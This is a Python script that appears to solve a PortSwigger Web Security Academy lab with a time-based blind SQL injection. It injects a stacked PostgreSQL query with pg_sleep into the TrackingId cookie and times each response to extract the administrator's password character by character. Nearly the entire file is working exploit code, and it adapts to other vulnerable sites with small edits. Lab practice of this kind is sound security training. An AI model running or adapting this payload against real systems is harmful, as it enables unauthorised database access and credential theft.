#!/usr/bin/env python3
import requests
import time
import string
import urllib3
from urllib.parse import quote_plus
from requests.exceptions import RequestException

# === CONFIG ===
url = "https://0a8e009f039820a48160027300ef00a2.web-security-academy.net/"  # change if needed
session_cookie = "r988Zv2gH2qf7QoH3IN3W5fEZiQa5fIE"                         # replace with your session value
pw_length = 20
charset = string.ascii_lowercase + string.digits + string.ascii_uppercase
timeout = 15.0
delay_threshold = 4.5      # treat >4.5s as a pg_sleep(5) signal (tweak if needed)
confirm_repeats = 2        # number of times the request must be slow to confirm the char
verify_tls = False         # set True if you want to validate TLS certs

# keep single quotes unencoded so payload looks like your example
cookie_template = (
    "G'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{pos},1)='{ch}') "
    "THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sess = requests.Session()

def encode_payload(raw):
    enc = quote_plus(raw, safe="'")   # spaces -> +, keep single-quote
    enc = enc.replace("%3B", "%3b")   # normalize semicolon hex to lowercase %3b
    return enc

def build_cookie_header(pos, ch):
    raw = cookie_template.format(pos=pos, ch=ch)
    enc = encode_payload(raw)
    # the lab example shows `TrackingId=G'%3b+SELECT...` then session=...
    return f"TrackingId={enc}; session={session_cookie}"

def send_and_time(cookie_header):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": "https://portswigger.net/",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": cookie_header
    }
    start = time.time()
    r = sess.get(url, headers=headers, timeout=timeout, verify=verify_tls)
    return time.time() - start, r.status_code

def confirm_slow(cookie_header):
    times = []
    for _ in range(confirm_repeats):
        try:
            t, sc = send_and_time(cookie_header)
        except RequestException:
            return False, times
        times.append(t)
        if t <= delay_threshold:
            return False, times
        # small spacing so the server isn't hammered
        time.sleep(0.2)
    return True, times

def main():
    found = ""
    for pos in range(1, pw_length + 1):
        print(f"\n[*] Position {pos} — trying charset ({len(charset)} chars)")
        pos_found = False
        for ch in charset:
            cookie_header = build_cookie_header(pos, ch)
            # quick probe first (single try)
            try:
                t, sc = send_and_time(cookie_header)
            except RequestException as e:
                print(f"  ! network error for {ch!r}: {e}")
                continue

            if t > delay_threshold:
                # double-check/confirm
                ok, times = confirm_slow(cookie_header)
                if ok:
                    found += ch
                    pos_found = True
                    print(f"[+] Found pos {pos} = {ch!r}  confirmed times: {', '.join(f'{x:.2f}s' for x in times)}")
                    print(f"    Current password: {found}")
                    break
                else:
                    # not confirmed, print debug info and continue
                    print(f"  - candidate {ch!r} not confirmed (times: {', '.join(f'{x:.2f}s' for x in times)})")
            # optional verbose single-line progress:
            # print(f"  tried {ch!r} -> {t:.2f}s", end="\r")
        if not pos_found:
            print(f"[-] No confirmed char for position {pos}. Adding '?' as placeholder.")
            found += "?"
    print("\n[RESULT] Discovered (partial) password:", found)

if __name__ == "__main__":
    main()
